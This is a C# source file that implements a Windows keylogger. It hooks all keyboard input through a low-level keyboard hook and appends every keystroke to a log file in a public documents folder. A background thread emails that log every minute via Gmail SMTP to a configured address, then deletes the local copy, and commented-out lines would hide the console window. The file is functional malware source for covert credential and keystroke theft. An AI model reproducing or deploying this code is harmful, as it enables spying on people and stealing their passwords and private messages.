using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;
using System.IO;
using System.Threading;
namespace noop
{
    public partial class Jook
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static String file_path = @"C:\Users\Public\Documents\jook.log";
        static bool work = true;
        public static void Start()
        {
            //var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE);
            _hookID = SetHook(_proc);
            t.Start();
            //Application.Run();
            
        }
        public static void Stop()
        {
            UnhookWindowsHookEx(_hookID);
            work = false;
        }
        public static void email_send()
        {
            sending = true;
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("mail_from");
            mail.To.Add("mail_to");
            mail.Subject = "jook1";
            mail.Body = System.DateTime.Now.ToString();

            System.Net.Mail.Attachment attachment;

            attachment = new System.Net.Mail.Attachment(file_path);

            mail.Attachments.Add(attachment);

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("mail_from", "mail_pass");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);

            mail.Dispose();
            File.Delete(file_path);
            sending = false;
        }
        public static void run()
        {
            while (work)
            {
                Thread.Sleep(1000 * 60);
                if (File.Exists(file_path)) email_send();
            }
        }
        static Thread t = new Thread(new ThreadStart(run));
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        static bool sending = false;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if ((nCode >= 0) && (wParam == (IntPtr)WM_KEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                foreach (Keys key in (Keys[])Enum.GetValues(typeof(Keys)))
                {
                    if ((Keys)vkCode == key)
                    {
                        while (sending)
                        {
                            Thread.Sleep(100);
                        }
                        StreamWriter sw = new StreamWriter(file_path, true);

                        if (key == Keys.Enter || key == Keys.Tab)
                            sw.WriteLine();
                        else if (key == Keys.Space)
                            sw.Write(" ");
                        else
                            sw.Write(key.ToString());
                        sw.Close();
                        StreamWriter swlog = new StreamWriter(file_path + "_log", true);
                        swlog.WriteLine(key.ToString());
                        swlog.Close();
                        return CallNextHookEx(_hookID, nCode, wParam, lParam);
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
